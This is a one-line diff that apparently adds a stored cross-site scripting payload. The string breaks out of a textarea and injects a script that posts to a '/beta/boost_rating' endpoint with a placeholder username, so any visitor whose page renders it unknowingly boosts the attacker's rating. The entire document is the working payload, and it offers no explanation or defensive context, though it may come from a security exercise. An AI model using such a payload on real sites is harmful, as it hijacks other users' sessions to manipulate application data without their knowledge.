@@ -1,0 +1,1 @@
+ "></textarea><script>$.post("/beta/boost_rating", {"username": "MY_USER"})</script><textarea>
